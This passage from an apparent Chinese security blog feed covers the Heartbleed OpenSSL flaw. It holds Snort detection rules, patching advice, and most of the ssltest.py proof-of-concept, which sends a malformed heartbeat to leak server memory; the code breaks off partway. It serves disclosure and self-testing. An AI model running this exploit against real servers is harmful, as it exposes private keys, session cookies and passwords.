&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 02|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30516; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER TLSv1.2 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 03|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30517; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;民眾與管理者應對措施&quot;&gt;民眾與管理者應對措施&lt;/h3&gt;

&lt;p&gt;不少朋友來信、留言洽詢，到底自己該怎麼針對這次的漏洞應變？我們簡單就一般民眾以及系統管理者說明。&lt;/p&gt;

&lt;h3 id=&quot;一般民眾應對措施&quot;&gt;一般民眾應對措施&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;注意常用的重要網站服務，是否有針對 Heartbleed 漏洞的更新措施。不少大公司都有發出公告、公告信等。&lt;/li&gt;
  &lt;li&gt;若常用網站服務有遭遇此風險，記得更換帳號密碼。&lt;/li&gt;
  &lt;li&gt;若這段時間有網站通知更換密碼，也請注意是否為釣魚信件。&lt;/li&gt;
  &lt;li&gt;注意自己的帳號是否有異常活動。&lt;/li&gt;
  &lt;li&gt;若使用的網站服務就是不更新，&lt;strong&gt;一天一信友善提醒管理者&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;系統管理者應對措施&quot;&gt;系統管理者應對措施&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;更新 OpenSSL 至 1.0.1g 或 1.0.2-beta2，並密切注意有無後續更新。&lt;/li&gt;
  &lt;li&gt;重新產生金鑰（Private Key 可能外洩）、Session（Session ID 可能外洩）、密碼（密碼也可能外洩），並且撤銷原本的金鑰。&lt;/li&gt;
  &lt;li&gt;若無法更新，重新編譯 OpenSSL 以關閉 heartbeat 功能。&lt;/li&gt;
  &lt;li&gt;使用 &lt;a href=&quot;http://en.wikipedia.org/wiki/Forward_secrecy&quot;&gt;Perfect Forward Secrecy (PFS)&lt;/a&gt;，在未來類似風險發生時減低傷害。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;許多業者抱持著僥倖的心態，想說外洩的目標不會輪到自己。如果大家看到這幾天&lt;strong&gt;全世界資安人員 / 駭客不眠不休的撈取資料&lt;/strong&gt;，應該會徹底消滅僥倖的想法乖乖做好防護。在漏洞揭露的頭幾天，就已經陸續看到不少駭客進入 Google、Facebook、Yahoo! 等伺服器，並且撰寫大規模掃描工具大量攻擊。除非你有把握自己的伺服器沒有任何連線，不然還是請乖乖更新吧。&lt;/p&gt;

&lt;h3 id=&quot;大事件大啟示&quot;&gt;大事件，大啟示&lt;/h3&gt;

&lt;p&gt;還記得之前我們提到的「&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;使用第三方套件所要擔負的資安風險&lt;/a&gt;」？這次的事件就是一個血淋淋的案例。不管是廠商、社群、個人開發者的粗心失誤，或者是國家機器 NSA 的強力滲透，使用各種第三方的套件都需要承擔極大的風險。但可悲的是，我們卻無法不使用。從這次的事件我們可以學到幾件事情：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;不管哪種攻擊手法、多老舊的攻擊手法，在未來都可能會再度發生。&lt;/li&gt;
  &lt;li&gt;程式碼的 review 非常重要，一定要在開發過程中導入程式碼 review 機制，以免開發者寫出含有安全疑慮的程式碼。&lt;/li&gt;
  &lt;li&gt;加密、Session 控管、金鑰控管等議題，是永遠的課題。一天沒處理好，在未來的風險中會再度受害。&lt;/li&gt;
  &lt;li&gt;風險永遠會發生在你猜不到的地方，可能是程式、可能是函式庫、&lt;a href=&quot;http://technews.tw/2013/09/06/most-common-encryption-protocols-are-useless-against-nsa-surveillance/&quot;&gt;可能是加密協定&lt;/a&gt;、更可能是&lt;a href=&quot;http://ckhung0.blogspot.tw/2014/03/dual-ec-drbg.html&quot;&gt;亂數產生器&lt;/a&gt;。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;不斷的增強資安意識、不停的分享新知、廠商做好資安控管及&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;安全檢測&lt;/a&gt;、民眾對企業和政府要求資訊安全，集合大家的力量，是改善資安大環境的不二法門。&lt;/p&gt;

&lt;p&gt;你以為自己逃過一劫了嗎？也許你的身體已經血流如柱，而嗜血的鯊魚正游向你。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/</link>
                <guid>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect</guid>
                <pubDate>Fri, 11 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞 </title>
                <description>&lt;h3 id=&quot;openssl-cve-2014-0160-嚴重漏洞&quot;&gt;OpenSSL CVE-2014-0160 嚴重漏洞&lt;/h3&gt;

&lt;p&gt;OpenSSL 今天公告了一個極度嚴重的漏洞（&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160&quot;&gt;CVE-2014-0160&lt;/a&gt;），被稱為「&lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed&lt;/a&gt;」，而他確實也如同心臟噴出血般嚴重。這個漏洞能讓攻擊者從伺服器記憶體中讀取 64 KB 的資料，利用傳送 heartbeat 的封包給伺服器，在封包中控制變數導致 memcpy 函數複製錯誤的記憶體資料，因而擷取記憶體中可能存在的機敏資料。記憶體中最嚴重可能包含 ssl private key、session cookie、使用者密碼等，因此可能因為這樣的漏洞導致伺服器遭到入侵或取得使用者帳號。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;詳細的分析可以參閱 &lt;a href=&quot;http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html&quot;&gt;existential type crisis : Diagnosis of the OpenSSL Heartbleed Bug&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;軟體名稱：OpenSSL&lt;/li&gt;
  &lt;li&gt;影響範圍：1.0.1 至 1.0.1f / 1.0.2-beta ~ 1.0.2-beta1&lt;/li&gt;
  &lt;li&gt;修復版本：1.0.1g / 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;影響系統版本
    &lt;ul&gt;
      &lt;li&gt;Debian Wheezy (stable), OpenSSL 1.0.1e-2+deb7u4&lt;/li&gt;
      &lt;li&gt;Ubuntu 12.04.4 LTS, OpenSSL 1.0.1-4ubuntu5.11&lt;/li&gt;
      &lt;li&gt;CentOS 6.5, OpenSSL 1.0.1e-15&lt;/li&gt;
      &lt;li&gt;Fedora 18, OpenSSL 1.0.1e-4&lt;/li&gt;
      &lt;li&gt;OpenBSD 5.3 (OpenSSL 1.0.1c 10 May 2012) and 5.4 (OpenSSL 1.0.1c 10 May 2012)&lt;/li&gt;
      &lt;li&gt;FreeBSD 10.0 - OpenSSL 1.0.1e 11 Feb 2013&lt;/li&gt;
      &lt;li&gt;NetBSD 5.0.2 (OpenSSL 1.0.1e)&lt;/li&gt;
      &lt;li&gt;OpenSUSE 12.2 (OpenSSL 1.0.1c)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;影響服務：HTTP、SMTPS、IMAPS、POP3S 等使用 OpenSSL 之服務&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OpenSSL 的公告如下：&lt;a href=&quot;https://www.openssl.org/news/secadv_20140407.txt&quot;&gt;https://www.openssl.org/news/secadv_20140407.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;
A missing bounds check in the handling of the TLS heartbeat extension can be
used to reveal up to 64k of memory to a connected client or server.

Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
1.0.1f and 1.0.2-beta1.
&lt;/pre&gt;

&lt;h3 id=&quot;如何自我檢測&quot;&gt;如何自我檢測？&lt;/h3&gt;

&lt;p&gt;要如何測試自己的網站有沒有這樣的漏洞呢？可以利用以下的網站或工具直接查詢。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed test &lt;a href=&quot;http://filippo.io/Heartbleed/&quot;&gt;http://filippo.io/Heartbleed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;直接輸入 Domain 即可查詢，例如「fbi.gov」。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;自我測試工具 &lt;a href=&quot;http://s3.jspenguin.org/ssltest.py&quot;&gt;http://s3.jspenguin.org/ssltest.py&lt;/a&gt; （或 &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;http://pastebin.com/WmxzjkXJ&lt;/a&gt;）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用方法直接執行「python ssltest.py ifttt.com」，或是用「-p」指定特定 SSL 連接埠。畫面上會顯示出記憶體資料，可能內含機敏資料例如 private key、session cookie 等。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;原始碼如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;select&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;optparse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;%prog server [options]&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Test for SSL heartbeat vulnerability (CVE-2014-0160)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;-p&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;--port&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;int&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;TCP port to test (default: 443)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos; 
18 03 02 00 03
01 40 00
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;%02X&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;.&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;  %04x: %-48s %s&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
